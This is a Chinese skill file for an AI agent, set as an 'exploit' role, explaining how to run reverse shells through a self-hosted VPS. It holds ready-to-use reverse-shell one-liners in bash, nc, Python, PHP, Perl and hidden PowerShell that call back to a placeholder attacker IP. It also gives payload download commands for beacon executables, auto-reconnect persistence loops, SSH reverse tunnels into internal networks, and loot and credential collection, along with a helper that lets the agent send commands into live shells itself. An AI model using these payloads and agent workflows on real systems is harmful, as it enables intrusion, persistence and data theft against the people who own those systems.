---
name: vps-reverse-shell
description: 用自建 VPS（<你的VPS_IP>，SSH 私钥登录）做反弹 Shell 落地与中转：9000-9999 端口监听、非交互会话驱动、载荷投递、反向隧道
whenToUse: 目标无法回连本机 / 需要公网固定监听端口 / 需要长期在线跳板 / 需要让智能体自己下发命令到反弹 Shell
role: exploit
enabled: true
---

# VPS 中转与反弹 Shell（<你的VPS_IP>）

自建公网 VPS 作为**反弹 Shell 落地端 + 载荷投递点 + 内网中转跳板**。目标只需要能访问互联网，
把 shell 弹到 VPS 的 9000-9999 端口；智能体通过 tmux 会话**非交互地**下发命令并读回输出。

## 何时用 / 何时不用

| 场景 | 选择 |
| --- | --- |
| 目标能直连本机（同网段、有公网 IP） | 直接本机监听，**不必**用 VPS |
| 目标只能出网、本机在内网（NAT 后） | ✅ 用 VPS，这是主场景 |
| 目标是云主机/容器，出网受限但能出 80/443 | ✅ 用 VPS 的 9000-9999（若被限制就用 443/80 类端口，见排障） |
| 只需要跑一条命令拿结果 | 优先用 Web 漏洞/RCE 的 HTTP 通道，比反弹 shell 更稳更隐蔽 |

## 资产与凭据

```
主机    : <你的VPS_IP>（腾讯云，Ubuntu 24.04，2C2G，主机名 <VPS 主机名>）
用户    : ubuntu（sudo 免密）
私钥    : ~/.dsh/redteam/toolkit/vps/id_rsa          ← 权限 600，不要复制进仓库/聊天
可用端口: 9000-9999                                   ← 云安全组只放了这一段
工具脚本: ~/.dsh/redteam/toolkit/vps/vps.sh
```

**密钥纪律**：私钥只在上面这个路径。任何情况下不要把私钥内容写进技能文件、报告、仓库或对话。

已长期占用的端口：**9001 / 9007 / 9009（还有其他 9008 等临时服务）**，另有 tmux 会话 `cap / sh / up / www`。
**这些不是本次演练的，不要 kill、不要覆盖。**

## 快速开始

```bash
VPS=~/.dsh/redteam/toolkit/vps/vps.sh

$VPS status                 # 看 VPS 状态、剩余端口、现有会话
$VPS listen                 # 自动挑一个空闲端口开监听（也可 $VPS listen 9000）
# → 拿到端口后，用目标上的漏洞执行反弹命令（见下一节）
$VPS send 9000 'id; uname -a'      # 目标回连后，下发命令
$VPS read 9000 60                  # 读回输出
$VPS kill 9000                     # 用完必须清理
```

`listen` 用 tmux + rlwrap + **自动重听循环**：连接断了会自动重新监听，适合反复触发。

## 工具用法（vps.sh）

| 子命令 | 作用 |
| --- | --- |
| `status` | VPS 身份、系统、工具就绪情况、9000-9999 占用、tmux 会话 |
| `port` | 自动返回一个 9000-9999 内的空闲端口 |
| `listen [port]` | 开持久监听（省略端口则自动选），打印目标侧命令模板 |
| `sessions` | 列出 VPS 上的 tmux 会话 |
| `send <port> '<cmd>'` | **把命令下发进已上线的反弹 Shell**（智能体主用） |
| `read <port> [行数]` | 读回该会话最近输出（默认 200 行） |
| `watch <port>` | 持续刷新输出（人看） |
| `attach <port>` | 本机 tmux 接管会话（人用，`Ctrl-B D` 退出） |
| `kill <port>` | 关闭监听 + 清理会话 + 释放端口 |
| `serve [port] [dir]` | VPS 上起 HTTP 服务，供目标下载载荷（默认 9008） |
| `push <本地> [远端]` | 上传文件到 VPS |
| `get <远端> [本地]` | 从 VPS 取回文件（把目标产物拉回来） |
| `sh '<命令>'` | 在 VPS 上直通执行任意命令 |

环境变量可覆盖：`VPS_HOST`、`VPS_KEY`。

## 目标侧反弹 payload（端口换成你 listen 的那个）

```bash
# Bash（最常用）
bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<你的VPS_IP>/9000 <&1'

# nc 系（有 -e 的版本）
nc <你的VPS_IP> 9000 -e /bin/bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <你的VPS_IP> 9000 > /tmp/f

# Python（无 nc 时的兜底，兼容 python2/3）
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<你的VPS_IP>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP（Web 侧 getshell 后常用）
php -r '$s=fsockopen("<你的VPS_IP>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<你的VPS_IP>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<你的VPS_IP>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**URL 编码**：走 Web 漏洞（命令注入/RCE）时把 payload 整体 URL 编码后再传参，避免 `&`、`>` 被截断。

## 会话升级与稳定化

裸 `nc` 出来的 shell 没有 TTY：不能 `sudo`、不能 `su`、`vi` 和 `top` 会异常。升级：

```bash
# 目标上执行（python3 必装率最高）
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 或
script -qc /bin/bash /dev/null
```

```bash
# 本机侧（attach 后）让 Ctrl-C/方向键正常
# 在反弹 shell 里依次：Ctrl-Z
stty raw -echo; fg
# 回车两次，然后
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
```

**更稳的方案：socat 全 TTY 监听**（VPS 上已装 socat）：

```bash
$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
# 目标侧
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<你的VPS_IP>:9000
```

掉线自动重连（目标侧循环）：

```bash
while true; do bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'; sleep 10; done &
```

## 载荷投递（VPS 当文件中转）

```bash
$VPS serve 9100 ~/rt/payloads        # VPS 上起 HTTP 服务
$VPS push ./suo5 /home/ubuntu/rt/payloads/
# 目标侧（Linux）
curl -O http://<你的VPS_IP>:9100/suo5  或  wget http://<你的VPS_IP>:9100/suo5
# 目标侧（Windows）
certutil -urlcache -split -f http://<你的VPS_IP>:9100/beacon.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<你的VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
```

**取回战利品**：`$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<靶标>/runs/`

## 反向隧道与中转

目标在内网、本机不可达时，用 VPS 当跳板：

```bash
# 反向隧道：VPS:9200 → 目标内网 10.0.0.5:8080（在目标上执行）
ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <目标上的密钥> ubuntu@<你的VPS_IP>
# 之后本机经 VPS 访问：ssh -L 8080:127.0.0.1:9200 ubuntu@<你的VPS_IP>

# socat 端口转发（VPS 上）
$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
```

WebShell 场景配合技能 `suo5-tunnel`：把 suo5 客户端放本机，服务端传到目标，隧道出口经 VPS 更稳。

## 纪律（务必遵守）

1. **端口纪律**：只用 9000-9999，开监听前先 `$VPS port` 或 `$VPS status` 确认空闲；**绝不占用/杀掉 9001、9007、9009 与 `cap/sh/up/www` 会话**。
2. **每次用完必须 `$VPS kill <port>`**，不要留下裸监听（既是资源占用也是痕迹）。
3. **凭据落库、不留 VPS**：目标上抓到的口令/哈希用 `redteam_credential_add` 写进本机资产库（明文 `secret_value`），产物落本机 `runs/`；**不要把凭据写进 VPS 家目录**。
4. **VPS IP 对目标可见**：它属于本次演练的基础设施，不要在目标上留下包含它之外的额外个人信息。
5. **落库**：每次成功拿到 shell 用 `redteam_access_add` 记录（host/账号/方式/权限/会话引用），每条凭据用 `redteam_credential_add` 记录，攻击脚本用 `redteam_attack_file_add` 归档。
6. **`send` 出去的每条命令都要能从 `read` 的输出里拿到证据**，重要输出先重定向到文件再 `get` 回来，避免 tmux 回滚缓冲被刷掉。

## 排障

| 现象 | 处理 |
| --- | --- |
| 目标回连不上 | 先确认监听真在：`$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`；再确认目标出网（目标上 `curl -s http://<你的VPS_IP>:<port>` 若返回连接成功说明端口可达） |
| 端口在范围外/换端口 | 云安全组只放了 9000-9999，超范围必失败 |
| 反复掉线 | 目标侧加 `while true` 重连循环；或用 socat 全 TTY 方案 |
| 有回显但命令不执行 | payload 被 URL 截断（`&`/`>`），整体 URL 编码 |
| 中文乱码 | 目标上 `export LANG=C.UTF-8`，或先 `read` 前把 tmux 设置 `tmux set -t rt-<port> utf8 on` |
| 无 TTY、`sudo` 报错 | 升级 PTY（见上） |
| 本机探测端口"全部可连" | 本机网关会对任意端口回 SYN-ACK，**本机 `nc -z` 不能判断 VPS 端口可达性**；要用外部节点或目标本身验证 |

## 与其他技能的关系

- `suo5-tunnel`：WebShell → SOCKS5 隧道，出口可以走本 VPS
- `webshell-toolkit`：冰蝎/哥斯拉/蚁剑，拿到 WebShell 后的管理
- `cn-proxy-pool`：需要国内出口 IP 时叠加代理（不要改动本机网络配置）
- `active-scan` / `fofa-recon`：内网可达后继续测绘
